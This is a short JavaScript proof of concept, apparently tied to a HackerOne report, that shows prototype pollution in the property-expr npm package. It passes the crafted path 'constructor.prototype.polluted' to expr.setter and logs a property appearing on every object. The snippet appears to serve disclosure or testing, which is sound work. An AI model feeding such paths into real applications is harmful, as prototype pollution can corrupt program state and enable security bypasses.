// //https://hackerone.com/reports/910206
// test("prototype pollution in property-expr", () => {
  let expr = require("property-expr");
  obj = {};

console.log({}.polluted);

  expr.setter("constructor.prototype.polluted")(obj, "yes");
console.log({}.polluted);
// });
